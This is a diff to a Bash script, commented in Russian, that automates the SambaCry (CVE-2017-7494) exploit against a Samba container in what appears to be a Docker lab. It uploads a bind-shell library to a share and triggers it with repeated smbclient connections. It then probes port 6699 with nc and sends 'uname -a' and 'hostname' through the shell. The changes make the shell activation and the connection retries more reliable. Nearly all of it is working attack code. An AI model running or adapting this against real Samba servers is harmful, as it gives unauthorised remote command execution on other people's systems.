@@ -56,7 +56,7 @@ echo "Эксплуатация SambaCry на 172.20.0.104..."
 EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 30 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699 2>&1" || echo "")
 
 # Выводим вывод эксплойта (игнорируем ошибки потоков в конце, но сохраняем важные строки)
-echo "$EXPLOIT_OUTPUT" | grep -vE "Exception in thread|Traceback|AttributeError|__bootstrap_inner|File \"/usr/lib/python2.7|most likely raised during interpreter shutdown" | head -20
+echo "$EXPLOIT_OUTPUT" | grep -vE "Exception in thread|Traceback|AttributeError|__bootstrap_inner|File \"/usr/lib/python2.7|most likely raised during interpreter shutdown|receiveAndPrint" | head -20
 
 # Проверяем, удалось ли эксплойту подключиться
 # Ищем строки с выводом команд (начинаются с >>)
@@ -67,29 +67,69 @@ if echo "$EXPLOIT_OUTPUT" | grep -qE ">>Linux|>>victim-samba|>>.*Linux|>>.*kerne
 else
     # Пробуем подключиться к bind shell вручную
     echo ""
+    
+    # Проверяем, что библиотека действительно загружена
+    echo "Проверка загруженной библиотеки в SMB share..."
+    docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls libbindshell-samba.so'" || echo "Библиотека не найдена в share"
+    
     UNAME_OUTPUT=""
     HOSTNAME_OUTPUT=""
     
-    # Даем время на инициализацию bind shell после загрузки библиотеки
-    sleep 12
+    # Даем больше времени на инициализацию bind shell после загрузки библиотеки
+    # Библиотека должна выполниться при следующем подключении к share
+    echo "Ожидание инициализации bind shell (библиотека может выполниться при следующем SMB подключении)..."
+    sleep 15
+    
+    # Пробуем вызвать выполнение библиотеки через SMB подключение к share
+    echo "Попытка активации библиотеки через SMB подключение..."
+    docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls' > /dev/null 2>&1" || true
+    sleep 5
+    
+    # Проверяем доступность порта перед попытками подключения
+    echo "Проверка доступности порта 6699..."
+    PORT_OPEN=$(docker exec attacker bash -c "timeout 3 nc -zv 172.20.0.104 6699 2>&1" | grep -q "succeeded\|open" && echo "open" || echo "closed")
+    
+    if [ "$PORT_OPEN" = "closed" ]; then
+        echo "Порт 6699 закрыт. Библиотека может не выполниться автоматически."
+        echo "Попытка активации через дополнительное SMB подключение..."
+        # Пробуем несколько раз подключиться к share, чтобы активировать библиотеку
+        for i in 1 2 3; do
+            docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls' > /dev/null 2>&1" || true
+            sleep 3
+            PORT_OPEN=$(docker exec attacker bash -c "timeout 3 nc -zv 172.20.0.104 6699 2>&1" | grep -q "succeeded\|open" && echo "open" || echo "closed")
+            if [ "$PORT_OPEN" = "open" ]; then
+                echo "Порт 6699 открыт после активации!"
+                break
+            fi
+        done
+    fi
     
     # Пробуем подключиться несколько раз с задержками
-    for attempt in 1 2 3 4 5; do
+    for attempt in 1 2 3 4 5 6; do
         if [ $attempt -gt 1 ]; then
-            echo "Попытка подключения $attempt/5..."
-            sleep 6
+            echo "Попытка подключения $attempt/6..."
+            sleep 8
+        fi
+        
+        # Проверяем порт перед каждой попыткой
+        PORT_CHECK=$(docker exec attacker bash -c "timeout 2 nc -zv 172.20.0.104 6699 2>&1" | grep -q "succeeded\|open" && echo "open" || echo "closed")
+        if [ "$PORT_CHECK" = "closed" ]; then
+            echo "Порт закрыт, пробуем активировать библиотеку снова..."
+            docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls' > /dev/null 2>&1" || true
+            sleep 5
+            continue
         fi
         
         # Пробуем получить uname -a (используем более надежный способ с ожиданием ответа)
-        UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 20 bash -c '(sleep 3; printf \"uname -a\\r\\n\"; sleep 5) | nc -w 15 172.20.0.104 6699 2>/dev/null | strings -n 5 | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
+        UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 25 bash -c '(sleep 4; printf \"uname -a\\r\\n\\r\\n\"; sleep 6) | nc -w 18 172.20.0.104 6699 2>/dev/null | strings -n 5 | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
         
         if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 30 ]; then
             # Проверяем, что это похоже на вывод uname
             if echo "$UNAME_OUTPUT" | grep -qiE "linux|kernel|x86_64|GNU|SMP"; then
                 echo ">>$UNAME_OUTPUT"
                 echo "hostname"
-                sleep 3
-                HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 20 bash -c '(sleep 3; printf \"hostname\\r\\n\"; sleep 4) | nc -w 15 172.20.0.104 6699 2>/dev/null | strings -n 3 | grep -vE \"hostname|^$\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
+                sleep 4
+                HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 25 bash -c '(sleep 4; printf \"hostname\\r\\n\\r\\n\"; sleep 5) | nc -w 18 172.20.0.104 6699 2>/dev/null | strings -n 3 | grep -vE \"hostname|^$\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection|closed|Ncat" | head -1 || echo "")
                 if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ] && [ ${#HOSTNAME_OUTPUT} -gt 0 ]; then
                     echo ">>$HOSTNAME_OUTPUT"
                     break
